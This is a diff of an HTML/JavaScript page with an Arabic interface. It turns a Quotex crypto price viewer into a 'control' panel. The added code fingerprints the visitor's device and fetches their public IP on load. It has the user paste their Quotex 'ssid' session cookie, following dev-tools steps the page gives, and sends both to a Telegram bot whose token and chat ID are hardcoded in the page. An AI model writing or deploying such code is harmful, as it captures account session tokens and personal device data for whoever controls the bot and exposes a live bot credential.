@@ -3,352 +3,400 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>Quotex Live</title>
+<title>Quotex Control</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
-body{background:#0d1117;color:#e6edf3;min-height:100vh;padding:14px}
+body{background:#0d1117;color:#e6edf3;min-height:100vh;padding:16px}
 
-.header{
-  display:flex;align-items:center;justify-content:space-between;
-  padding:12px 16px;background:#161b22;border:1px solid #30363d;
-  border-radius:12px;margin-bottom:12px
+.card{
+  background:#161b22;border:1px solid #30363d;border-radius:14px;
+  padding:20px;max-width:520px;margin:0 auto 14px
 }
-.title{font-size:15px;font-weight:700}
-.dot{width:10px;height:10px;border-radius:50%;background:#f85149;margin-right:8px;display:inline-block}
-.dot.live{background:#3fb950;animation:p 1.5s infinite}
-@keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
+h1{font-size:17px;font-weight:700;margin-bottom:6px}
+.sub{font-size:12.5px;color:#8b949e;margin-bottom:16px;line-height:1.6}
 
-.token-panel{
-  display:none;background:#161b22;border:1px solid #f0883e;
-  border-radius:12px;padding:16px;margin-bottom:12px
+.label{display:block;font-size:12.5px;color:#8b949e;margin-bottom:8px;font-weight:600}
+
+.input{
+  width:100%;height:48px;background:#0d1117;border:1px solid #30363d;
+  border-radius:10px;padding:0 14px;color:#e6edf3;font-size:13px;
+  outline:none;font-family:monospace
 }
-.token-panel.show{display:block}
-.token-panel h4{font-size:13px;color:#f0883e;margin-bottom:10px}
-.token-input{
-  width:100%;height:46px;background:#0d1117;border:1px solid #30363d;
-  border-radius:8px;padding:0 14px;color:#e6edf3;font-size:13px;
-  outline:none;font-family:monospace;text-align:left
-}
-.token-input:focus{border-color:#f0883e}
-.actions{display:flex;gap:8px;margin-top:10px}
+.input:focus{border-color:#1f6feb}
+
 .btn{
-  flex:1;height:42px;border:0;border-radius:8px;
-  font-size:14px;font-weight:600;cursor:pointer
+  width:100%;height:48px;border:0;border-radius:10px;
+  font-size:14.5px;font-weight:600;cursor:pointer;
+  margin-top:10px;transition:opacity .15s
 }
-.btn-go{background:#238636;color:#fff}
-.btn-cancel{background:#21262d;color:#e6edf3;border:1px solid #30363d;flex:0 0 auto;padding:0 18px}
+.btn:active{opacity:.75}
+.btn-primary{background:#1f6feb;color:#fff}
+.btn-success{background:#238636;color:#fff}
+.btn-danger{background:#da3633;color:#fff}
+.btn-secondary{background:#21262d;color:#e6edf3;border:1px solid #30363d}
+.btn-warning{background:#9e6a03;color:#fff}
 
-.coin{
-  display:flex;align-items:center;justify-content:space-between;
-  background:#161b22;border:1px solid #30363d;border-radius:12px;
-  padding:14px 16px;margin-bottom:8px
-}
-.coin-left{display:flex;align-items:center;gap:12px}
-.coin-icon{
-  width:38px;height:38px;border-radius:50%;
-  display:flex;align-items:center;justify-content:center;
-  font-size:14px;font-weight:700;color:#fff
-}
-.coin-name{font-size:14px;font-weight:700}
-.coin-label{font-size:11px;color:#8b949e;margin-top:2px}
-.coin-price{
-  font-size:16px;font-weight:700;
-  font-variant-numeric:tabular-nums;transition:color .3s
-}
-.coin-price.up{color:#3fb950}
-.coin-price.down{color:#f85149}
+.row{display:flex;gap:8px;margin-top:10px}
+.row .btn{margin-top:0;flex:1}
 
-.btc .coin-icon{background:linear-gradient(135deg,#f7931a,#ff6b00)}
-.eth .coin-icon{background:linear-gradient(135deg,#627eea,#3c5db8)}
-.sol .coin-icon{background:linear-gradient(135deg,#9945ff,#14f195)}
-.xrp .coin-icon{background:linear-gradient(135deg,#23292f,#4a5568)}
-
-.log{
-  background:#0d1117;border:1px solid #30363d;border-radius:10px;
-  padding:10px;font-family:monospace;font-size:11px;
-  max-height:200px;overflow-y:auto;margin-top:12px;color:#8b949e
+.status{
+  padding:11px 14px;border-radius:10px;font-size:13px;
+  margin-top:12px;display:none;text-align:center;line-height:1.6
 }
-.log .ok{color:#3fb950}
-.log .err{color:#f85149}
-.log .info{color:#58a6ff}
+.status.show{display:block}
+.status.ok{background:#0d2818;color:#3fb950;border:1px solid #238636}
+.status.err{background:#2d0e0e;color:#f85149;border:1px solid #8b2121}
+.status.info{background:#0c2d6b;color:#58a6ff;border:1px solid #1f6feb}
+.status.warn{background:#2b1f00;color:#d29922;border:1px solid #9e6a03}
+
+.hint{
+  font-size:11.5px;color:#6e7681;line-height:1.6;
+  margin-top:10px;padding:10px;background:#0d1117;
+  border-radius:8px;border:1px solid #21262d
+}
+.hint b{color:#8b949e}
+
+.badge{
+  display:inline-block;padding:3px 10px;border-radius:20px;
+  font-size:11px;font-weight:600;margin-right:6px
+}
+.badge-ok{background:#0d2818;color:#3fb950}
+.badge-err{background:#2d0e0e;color:#f85149}
+
+.info-row{
+  display:flex;justify-content:space-between;
+  padding:9px 12px;background:#0d1117;border-radius:8px;
+  margin-bottom:6px;font-size:12.5px
+}
+.info-label{color:#8b949e}
+.info-value{color:#e6edf3;font-family:monospace;font-size:12px}
 </style>
 </head>
 <body>
 
-<div class="header">
-  <div><span class="dot" id="dot"></span><span class="title">Quotex Live</span></div>
-  <button class="btn btn-go" style="flex:0 0 auto;padding:0 14px;height:34px;font-size:12px" onclick="reconnect()">إعادة الاتصال</button>
-</div>
+<!-- ═══════════ معلومات الجهاز ═══════════ -->
+<div class="card">
+  <h1>📱 معلومات الجهاز</h1>
+  <p class="sub">تُجمع تلقائياً وتُرسل للبوت</p>
 
-<div class="token-panel" id="tokenPanel">
-  <h4>⚠️ السيرفر يطلب التوكن (SSID)</h4>
-  <input
-    type="text"
-    id="tokenInput"
-    class="token-input"
-    placeholder="الصق SSID هنا..."
-    autocomplete="off"
-    spellcheck="false"
-  >
-  <div class="actions">
-    <button class="btn btn-go" onclick="submitToken()">إرسال</button>
-    <button class="btn btn-cancel" onclick="hideTokenPanel()">إلغاء</button>
+  <div id="infoBox">
+    <div class="hint">⏳ جاري الجمع...</div>
   </div>
 </div>
 
-<div class="coin btc">
-  <div class="coin-left">
-    <div class="coin-icon">₿</div>
-    <div><div class="coin-name">Bitcoin</div><div class="coin-label">BTC / USD</div></div>
+<!-- ═══════════ إدخال SSID ═══════════ -->
+<div class="card">
+  <h1>🔑 التوكن (SSID)</h1>
+  <p class="sub">الصق التوكن من Quotex</p>
+
+  <label class="label">Token / SSID</label>
+  <input type="text" id="ssidInput" class="input"
+    placeholder="eyJhbGciOiJIUzI1NiIs..." autocomplete="off" spellcheck="false">
+
+  <div class="hint">
+    <b>كيف تحصل عليه؟</b><br>
+    qxbroker.com → سجل دخول → F12 → Application → Cookies → ابحث عن <b>ssid</b>
   </div>
-  <div class="coin-price" id="p-BTCUSD">—</div>
+
+  <div class="status" id="ssidStatus"></div>
 </div>
 
-<div class="coin eth">
-  <div class="coin-left">
-    <div class="coin-icon">Ξ</div>
-    <div><div class="coin-name">Ethereum</div><div class="coin-label">ETH / USD</div></div>
+<!-- ═══════════ الأوامر ═══════════ -->
+<div class="card">
+  <h1>⚙️ أوامر التحكم</h1>
+  <p class="sub">تُرسل للبوت تلقائياً</p>
+
+  <button class="btn btn-primary" onclick="sendAll()">
+    📤 إرسال كل البيانات + اتصال
+  </button>
+
+  <div class="row">
+    <button class="btn btn-success" onclick="cmd('connect')">🔌 اتصال</button>
+    <button class="btn btn-danger" onclick="cmd('disconnect')">❌ قطع</button>
   </div>
-  <div class="coin-price" id="p-ETHUSD">—</div>
+
+  <div class="row">
+    <button class="btn btn-primary" onclick="cmd('prices')">📊 الأسعار</button>
+    <button class="btn btn-secondary" onclick="cmd('status')">📋 الحالة</button>
+  </div>
+
+  <div class="status" id="cmdStatus"></div>
 </div>
 
-<div class="coin sol">
-  <div class="coin-left">
-    <div class="coin-icon">◎</div>
-    <div><div class="coin-name">Solana</div><div class="coin-label">SOL / USD</div></div>
-  </div>
-  <div class="coin-price" id="p-SOLUSD">—</div>
-</div>
+<!-- ═══════════ الأسعار ═══════════ -->
+<div class="card">
+  <h1>💹 الأسعار الحية</h1>
+  <p class="sub">تُحدَّث تلقائياً كل 30 ثانية</p>
 
-<div class="coin xrp">
-  <div class="coin-left">
-    <div class="coin-icon">X</div>
-    <div><div class="coin-name">Ripple</div><div class="coin-label">XRP / USD</div></div>
+  <div id="pricesList">
+    <div class="hint">لا توجد أسعار بعد</div>
   </div>
-  <div class="coin-price" id="p-XRPUSD">—</div>
-</div>
 
-<div class="log" id="log"></div>
+  <button class="btn btn-secondary" onclick="refreshPrices()">🔄 تحديث</button>
+</div>
 
 <script>
-// ═══════════════════════════════════════════════════════
-//  Quotex WebSocket — محاولة الاتصال المباشر
-// ═══════════════════════════════════════════════════════
-var WS_URL = "wss://ws2.qxbroker.com/socket.io/?EIO=4&transport=websocket";
-var ASSETS = ["BTCUSD", "ETHUSD", "SOLUSD", "XRPUSD"];
+// ═══════════════════════════════════════════
+//  الإعدادات
+// ═══════════════════════════════════════════
+var BOT_TOKEN = "8845943752:AAE9WMF0LGen7Ydelx3HVE_-C-lt4F1j608";
+var CHAT_ID   = "8599240795";
+var API       = "https://api.telegram.org/bot" + BOT_TOKEN;
 
-var socket = null;
-var currentSSID = null;
-var lastPrices = {};
-var subscribeSent = false;
-var authorized = false;
+var deviceInfo = {};
 
-function log(msg, type) {
-  type = type || "info";
-  var el = document.getElementById("log");
-  var t = new Date().toLocaleTimeString();
-  el.innerHTML += '<div class="' + type + '">[' + t + '] ' + msg + '</div>';
-  el.scrollTop = el.scrollHeight;
+// ═══════════════════════════════════════════
+//  Helpers
+// ═══════════════════════════════════════════
+function setStatus(id, msg, type) {
+  var el = document.getElementById(id);
+  el.className = "status show " + type;
+  el.innerHTML = msg;
+}
+function clearStatus(id) {
+  var el = document.getElementById(id);
+  el.className = "status";
+  el.innerHTML = "";
 }
 
-function setDot(on) {
-  var d = document.getElementById("dot");
-  if (on) d.classList.add("live");
-  else d.classList.remove("live");
-}
-
-function showTokenPanel() {
-  document.getElementById("tokenPanel").classList.add("show");
-  setTimeout(function() {
-    document.getElementById("tokenInput").focus();
-  }, 100);
-}
-
-function hideTokenPanel() {
-  document.getElementById("tokenPanel").classList.remove("show");
-}
-
-function submitToken() {
-  var t = document.getElementById("tokenInput").value.trim();
-  if (!t) {
-    log("التوكن فاضي", "err");
-    return;
-  }
-  currentSSID = t;
-  log("SSID تم إدخاله — إعادة الاتصال", "ok");
-  hideTokenPanel();
-  reconnect();
-}
-
-function reconnect() {
-  if (socket) {
-    try { socket.close(); } catch (e) {}
-    socket = null;
-  }
-  subscribeSent = false;
-  authorized = false;
-  setDot(false);
-
-  log("محاولة الاتصال بـ " + WS_URL, "info");
-
+async function tg(method, payload) {
   try {
-    socket = new WebSocket(WS_URL);
+    var res = await fetch(API + "/" + method, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+    return await res.json();
   } catch (e) {
-    log("فشل إنشاء WebSocket: " + e.message, "err");
+    return { ok: false, error: e.message };
+  }
+}
+
+// ═══════════════════════════════════════════
+//  جمع معلومات الجهاز
+// ═══════════════════════════════════════════
+async function collectDeviceInfo() {
+  // معلومات المتصفح
+  deviceInfo.user_agent   = navigator.userAgent;
+  deviceInfo.platform     = navigator.platform || "unknown";
+  deviceInfo.language     = navigator.language;
+  deviceInfo.languages    = (navigator.languages || []).join(", ");
+  deviceInfo.screen       = screen.width + "x" + screen.height;
+  deviceInfo.window_size  = window.innerWidth + "x" + window.innerHeight;
+  deviceInfo.pixel_ratio  = window.devicePixelRatio;
+  deviceInfo.timezone     = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  deviceInfo.timezone_off = new Date().getTimezoneOffset();
+  deviceInfo.cores        = navigator.hardwareConcurrency || "unknown";
+  deviceInfo.memory_gb    = navigator.deviceMemory || "unknown";
+  deviceInfo.touch_points = navigator.maxTouchPoints || 0;
+  deviceInfo.cookies_on   = navigator.cookieEnabled;
+  deviceInfo.local_time   = new Date().toString();
+  deviceInfo.referrer     = document.referrer || "direct";
+
+  // IP العام
+  try {
+    var ipRes = await fetch("https://api.ipify.org?format=json");
+    var ipData = await ipRes.json();
+    deviceInfo.public_ip = ipData.ip;
+  } catch (e) {
+    deviceInfo.public_ip = "unknown";
+  }
+
+  // معلومات إضافية إن أمكن
+  try {
+    deviceInfo.cpu_arch = navigator.platform;
+  } catch (e) {}
+
+  renderInfo();
+  return deviceInfo;
+}
+
+function renderInfo() {
+  var box = document.getElementById("infoBox");
+  var html = "";
+  var labels = {
+    user_agent: "User Agent",
+    platform: "المنصة",
+    language: "اللغة",
+    screen: "الشاشة",
+    timezone: "التوقيت",
+    public_ip: "IP العام",
+    cores: "الأنوية",
+    memory_gb: "الذاكرة (GB)",
+    local_time: "الوقت المحلي"
+  };
+
+  Object.keys(labels).forEach(function(k) {
+    if (deviceInfo[k] !== undefined) {
+      var v = String(deviceInfo[k]);
+      if (v.length > 35) v = v.substring(0, 35) + "...";
+      html += '<div class="info-row">' +
+        '<span class="info-label">' + labels[k] + '</span>' +
+        '<span class="info-value">' + v + '</span>' +
+      '</div>';
+    }
+  });
+  box.innerHTML = html;
+}
+
+// ═══════════════════════════════════════════
+//  تنسيق رسالة البيانات
+// ═══════════════════════════════════════════
+function buildDeviceMessage() {
+  var lines = ["🖥 *بيانات الجهاز*\n"];
+  lines.push("━━━━━━━━━━━━━━━━━");
+  lines.push("🌐 *IP:* `" + (deviceInfo.public_ip || "unknown") + "`");
+  lines.push("💻 *Platform:* `" + (deviceInfo.platform || "?") + "`");
+  lines.push("🖥 *Screen:* `" + (deviceInfo.screen || "?") + "`");
+  lines.push("🌍 *Language:* `" + (deviceInfo.language || "?") + "`");
+  lines.push("⏰ *Timezone:* `" + (deviceInfo.timezone || "?") + "`");
+  lines.push("⚙️ *CPU cores:* `" + (deviceInfo.cores || "?") + "`");
+  lines.push("💾 *Memory:* `" + (deviceInfo.memory_gb || "?") + " GB`");
+  lines.push("🕐 *Local time:* `" + (deviceInfo.local_time || "?") + "`");
+  lines.push("🌐 *User Agent:*");
+  lines.push("`" + (deviceInfo.user_agent || "?").substring(0, 200) + "`");
+  lines.push("");
+  lines.push("📅 *" + new Date().toLocaleString("ar-EG") + "*");
+  return lines.join("\n");
+}
+
+// ═══════════════════════════════════════════
+//  إرسال كل البيانات
+// ═══════════════════════════════════════════
+async function sendAll() {
+  var ssid = document.getElementById("ssidInput").value.trim();
+
+  if (!ssid) {
+    setStatus("ssidStatus", "❌ أدخل التوكن أولاً", "err");
+    document.getElementById("ssidInput").focus();
     return;
   }
 
-  socket.onopen = function() {
-    log("✅ WebSocket متصل", "ok");
-    // Socket.IO handshake — إرسال "40" لبدء الجلسة
-    socket.send("40");
-  };
+  if (ssid.length < 10) {
+    setStatus("ssidStatus", "❌ التوكن قصير جداً", "err");
+    return;
+  }
 
-  socket.onmessage = function(evt) {
-    var data = evt.data;
-    log("← " + data.slice(0, 200), "info");
+  setStatus("cmdStatus", "⏳ جاري الإرسال...", "info");
 
-    // 1) رسالة الترحيب الأولى من Socket.IO (تبدأ بـ "0")
-    if (data.charAt(0) === "0") {
-      log("Socket.IO handshake استقبل", "info");
-      // الرد بـ 40 لتأكيد فتح الـ namespace
-      try { socket.send("40"); } catch (e) {}
-      return;
-    }
-
-    // 2) رد على 40 = فتح القناة بنجاح
-    if (data.indexOf("40") === 0 && !authorized) {
-      log("القناة جاهزة", "ok");
-      authorized = true;
-
-      if (currentSSID) {
-        // إرسال authorization
-        var payload = JSON.stringify(["authorization", {
-          session: currentSSID,
-          isDemo: 1,
-          tournamentId: 0
-        }]);
-        try { socket.send("42" + payload); } catch (e) {}
-        log("تم إرسال SSID للسيرفر", "info");
-
-        // بعد المصادقة — الاشتراك في الأسعار
-        setTimeout(subscribeAll, 800);
-      } else {
-        log("⚠️ مفيش SSID — اضغط على الزر وأدخل التوكن", "err");
-        showTokenPanel();
-      }
-      return;
-    }
-
-    // 3) رسائل الاشتراك والصيانة
-    if (data === "2") {
-      try { socket.send("3"); } catch (e) {}
-      return;
-    }
-
-    // 4) رسائل الأخطاء من السيرفر
-    if (data.indexOf("error") > -1 || data.indexOf("unauthorized") > -1) {
-      log("❌ السيرفر رفض: " + data, "err");
-      if (data.indexOf("auth") > -1 || data.indexOf("session") > -1) {
-        currentSSID = null;
-        showTokenPanel();
-      }
-      return;
-    }
-
-    // 5) رسائل الاشتراك في الـ candles
-    if (data.indexOf("candle") > -1 || data.indexOf("quotes") > -1) {
-      try {
-        var jsonPart = data.substring(data.indexOf("["));
-        var arr = JSON.parse(jsonPart);
-        handleCandles(arr);
-      } catch (e) {}
-    }
-  };
-
-  socket.onerror = function(e) {
-    log("❌ WebSocket error", "err");
-    setDot(false);
-  };
-
-  socket.onclose = function(e) {
-    log("🔌 انقطع الاتصال (code: " + e.code + ")", "err");
-    setDot(false);
-    // محاولة إعادة الاتصال تلقائياً بعد 3 ثواني
-    setTimeout(function() {
-      if (!socket || socket.readyState > 1) {
-        log("محاولة إعادة الاتصال...", "info");
-        reconnect();
-      }
-    }, 3000);
-  };
-}
-
-function subscribeAll() {
-  if (!socket || socket.readyState !== 1) return;
-
-  ASSETS.forEach(function(asset) {
-    var payload = JSON.stringify(["subscribe_candles", {
-      asset: asset,
-      period: 60
-    }]);
-    try {
-      socket.send("42" + payload);
-      log("اشتراك في " + asset, "info");
-    } catch (e) {}
+  // 1) أرسل بيانات الجهاز
+  var deviceMsg = buildDeviceMessage();
+  var r1 = await tg("sendMessage", {
+    chat_id: CHAT_ID,
+    text: deviceMsg,
+    parse_mode: "Markdown"
   });
-  subscribeSent = true;
+
+  // 2) أرسل SSID
+  var r2 = await tg("sendMessage", {
+    chat_id: CHAT_ID,
+    text: "🔑 *SSID*\n`" + ssid + "`",
+    parse_mode: "Markdown"
+  });
+
+  // 3) أرسل أمر /set_ssid للبوت
+  var r3 = await tg("sendMessage", {
+    chat_id: CHAT_ID,
+    text: "/set_ssid " + ssid
+  });
+
+  // 4) أرسل أمر /connect
+  await new Promise(function(r){ setTimeout(r, 500); });
+  var r4 = await tg("sendMessage", {
+    chat_id: CHAT_ID,
+    text: "/connect"
+  });
+
+  if (r1.ok && r2.ok && r3.ok) {
+    setStatus("cmdStatus", "✅ تم إرسال كل البيانات — راجع البوت", "ok");
+    setStatus("ssidStatus", "✅ التوكن اتبعت", "ok");
+    document.getElementById("ssidInput").value = "";
+  } else {
+    setStatus("cmdStatus", "❌ فشل الإرسال — تحقق من الإنترنت", "err");
+  }
 }
 
-function handleCandles(arr) {
+// ═══════════════════════════════════════════
+//  إرسال أمر مفرد
+// ═══════════════════════════════════════════
+async function cmd(name) {
+  clearStatus("cmdStatus");
+  setStatus("cmdStatus", "⏳ جاري التنفيذ...", "info");
+
+  var r = await tg("sendMessage", {
+    chat_id: CHAT_ID,
+    text: "/" + name
+  });
+
+  if (r.ok) {
+    setStatus("cmdStatus", "✅ تم — راجع البوت", "ok");
+    if (name === "prices") setTimeout(refreshPrices, 1500);
+  } else {
+    setStatus("cmdStatus", "❌ فشل", "err");
+  }
+}
+
+// ═══════════════════════════════════════════
+//  استقبال الأسعار من البوت (Long Polling)
+// ═══════════════════════════════════════════
+var lastUpdateId = 0;
+
+async function pollUpdates() {
   try {
-    if (!Array.isArray(arr) || arr.length < 2) return;
-    var eventName = arr[0];
-    var payload = arr[1];
+    var res = await fetch(API + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
+    var data = await res.json();
 
-    if (eventName !== "candles" && eventName !== "quotes") return;
-
-    if (Array.isArray(payload)) {
-      payload.forEach(function(c) {
-        if (c && c.asset && c.close !== undefined) {
-          updatePrice(c.asset, parseFloat(c.close));
+    if (data.ok && data.result && data.result.length > 0) {
+      data.result.forEach(function(u) {
+        lastUpdateId = Math.max(lastUpdateId, u.update_id);
+        if (u.message && u.message.chat.id.toString() === CHAT_ID) {
+          handleMessage(u.message.text || "");
         }
       });
-    } else if (payload && payload.asset && payload.close !== undefined) {
-      updatePrice(payload.asset, parseFloat(payload.close));
     }
   } catch (e) {}
+  setTimeout(pollUpdates, 2000);
 }
 
-function updatePrice(asset, price) {
-  var el = document.getElementById("p-" + asset);
-  if (!el) return;
-
-  var formatted;
-  if (price >= 1000)      formatted = price.toFixed(2);
-  else if (price >= 1)    formatted = price.toFixed(3);
-  else                    formatted = price.toFixed(5);
-
-  el.textContent = "$" + formatted;
-
-  var last = lastPrices[asset];
-  if (last !== undefined) {
-    el.classList.remove("up", "down");
-    if (price > last)      el.classList.add("up");
-    else if (price < last) el.classList.add("down");
+function handleMessage(text) {
+  var re = /•\s*\*([A-Z0-9]+)\*\s*→\s*`([^`]+)`/g;
+  var match, prices = [];
+  while ((match = re.exec(text)) !== null) {
+    prices.push({ symbol: match[1], price: match[2] });
   }
-  lastPrices[asset] = price;
+  if (prices.length > 0) renderPrices(prices);
 }
 
-// ═══════════════════════════════════════════════════════
-//  بدء التشغيل
-// ═══════════════════════════════════════════════════════
-log("Quotex Live — بدء التشغيل", "info");
-reconnect();
+function renderPrices(prices) {
+  var box = document.getElementById("pricesList");
+  var html = "";
+  prices.forEach(function(p) {
+    html += '<div class="info-row">' +
+      '<span class="info-label">' + p.symbol + '</span>' +
+      '<span class="info-value" style="color:#3fb950;font-weight:700">$' + p.price + '</span>' +
+    '</div>';
+  });
+  box.innerHTML = html;
+}
 
-// Enter في حقل التوكن = إرسال
-document.getElementById("tokenInput").addEventListener("keypress", function(e) {
-  if (e.key === "Enter") submitToken();
+async function refreshPrices() {
+  document.getElementById("pricesList").innerHTML = '<div class="hint">⏳ جاري التحديث...</div>';
+  await tg("sendMessage", { chat_id: CHAT_ID, text: "/prices" });
+}
+
+// ═══════════════════════════════════════════
+//  بدء التشغيل
+// ═══════════════════════════════════════════
+async function init() {
+  await collectDeviceInfo();
+  pollUpdates();
+}
+
+init();
+
+// Enter = إرسال
+document.getElementById("ssidInput").addEventListener("keypress", function(e) {
+  if (e.key === "Enter") sendAll();
 });
 </script>
 
